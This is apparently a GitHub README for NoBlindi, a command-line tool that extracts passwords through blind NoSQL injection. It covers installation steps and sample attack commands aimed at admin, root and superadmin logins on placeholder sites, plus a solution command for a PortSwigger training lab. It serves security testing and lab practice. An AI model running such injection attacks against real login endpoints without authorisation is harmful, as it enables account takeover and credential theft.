# NoBlindi
This tool is designed for testing the security of NoSQL databases in web applications. It focuses on identifying and exploiting blind NoSQL injection vulnerabilities to recover passwords. It's a command-line tool, making it easy to integrate into various testing workflows.
<p align="center"><img src="https://github.com/YasserREED/NoBlindi/assets/79475504/0b3ca6b0-752f-48fe-bc11-362b89f2ece8"></p>


![](https://img.shields.io/badge/Version-%20v1.0.0-blue)
![](https://img.shields.io/badge/Twitter-%20YasserREED-blue)
![](https://img.shields.io/badge/YouTube-%20YasserRED-red)

#### Features:
- **Blind NoSQL Injection for Password Recovery**
- **Customizable Parameters for Targeted Attacks**
- **Simple Command-Line Interface**
- **Cross-Platform Compatibility and Support**

## How to Download NoBlindi in Linux

### Copy this Link
```console
YasserREED@Linux:~$ sudo git clone https://github.com/YasserREED/NoBlindi.git
```
### Enter The File
```console
YasserREED@Linux:~$ cd NoBlindi/
```
### Download requirement library
```console
YasserREED@Linux:~$ pip install -r requirements.txt
```
### Open the tool by `python3`
```console
YasserREED@Linux:~$ python3 NoBlindi.py -h
```

<br>

## NoBlindi Help Guide

```console
YasserREED@Linux:~$ python3 NoBlindi.py -h
```

```console
YasserREED@Linux:~$ python3 NoBlindi.py -u https://example.com/login -uf 'username' -pf password -rn 'admin' -b '{"username":"", "password":""}' -sc 200 -f "Invalid credentials"
YasserREED@Linux:~$ python3 NoBlindi.py -u https://example.com/login -uf 'user' -un 'admin' -pf 'pass' -b '{"user":"", "pass":"", "redirect":"/dashboard", "security_question":"", "security_answer":""}' -sc 302 --redirect -sh "Authorization" -f "Login failed"
YasserREED@Linux:~$ python3 NoBlindi.py -u https://examplecorp.com/admin -uf 'login' -pf password -un 'superadmin' -b '{"login":"", "password":"start123!", "last_active_timestamp":"", "login_count":"", "account_status":"active"}' -sc 200 -f "Access Denied"
YasserREED@Linux:~$ python3 NoBlindi.py -u https://internalsite.example.org/login -uf 'username' -un 'root' -b '{"username":"", "password":"", "otp_code":"", "session_expiry":"1hr", "browser_info":"Mozilla/5.0"}' -sc 200 - "*+.?|{}[]"
YasserREED@Linux:~$ python3 NoBlindi.py -u https://api.example.com/v1/authenticate -uf 'email' -un 'johndoe@example.com' -pf 'pwd' -b '{"email":"", "pwd":"", "api_key":"", "request_time":"2023-03-15T12:00:00Z", "client_version":"1.2.3"}' -sc 200 -sh "JWT-Token" -f "Unauthorized
```

<br>

## Commands Examples

### Simple example:
```console
YasserREED@Linux:~$ python3 NoBlindi.py -u https://www.attacker.com/login -uf 'username' -pf password --username 'admin' -b '{"username":"", "password":""}'
```

### Make custom condition to check will status code 200 and login failed message:
```console
YasserREED@Linux:~$ python3 NoBlindi.py -u https://www.attacker.com/login -uf 'username' -pf password --username 'admin' -b '{"username":"", "password":""}' -success_code 200 -f "Invalid username or password"
```

<br>

## Portswigger Lab

1- Access the Lab: https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication

2- Use this command to solve the protswigger lab and retrieve the admin password:

```console
YasserREED@Linux:~$ python3 NoBlindi.py -u https://0a7a0055033f04f080539ef200bc00b5.web-security-academy.net/login  -uf 'username' -pf password -rn 'admin' -b '{"username":"", "password":""}' -sc 302 -rn 'admin' -r
```

### When we run the command:
![image](https://github.com/YasserREED/NoBlindi/assets/79475504/4a8d5682-ab1e-411c-94c4-f6803fdaaadf)

### After the tool is finished:
![image](https://github.com/YasserREED/NoBlindi/assets/79475504/fa5cc2ce-7654-4dac-b9b3-beb6af768fab)

---
<p align="center"> Enjoy! :heart_on_fire: </p>
